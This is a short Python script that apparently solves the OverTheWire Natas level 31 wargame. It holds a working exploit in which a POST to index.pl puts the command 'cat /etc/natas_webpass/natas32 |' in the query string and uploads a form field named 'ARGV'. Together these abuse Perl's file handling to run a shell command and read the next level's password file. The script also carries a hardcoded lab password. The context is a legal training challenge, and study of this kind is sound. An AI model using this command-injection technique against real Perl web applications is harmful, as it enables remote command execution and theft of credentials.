import requests
import string
from requests.auth import HTTPBasicAuth

url = 'http://natas31.natas.labs.overthewire.org/'
response = ''
# base auth
auth = HTTPBasicAuth('natas31', 'hay7aecuungiuKaezuathuk9biin0pu1')

response = requests.post(url + '/index.pl?cat /etc/natas_webpass/natas32 |',
                         files=[('file', ('filename', 'abc'))],
                         data={'file': 'ARGV'},
                         auth=auth)
text = response.text
print(text)
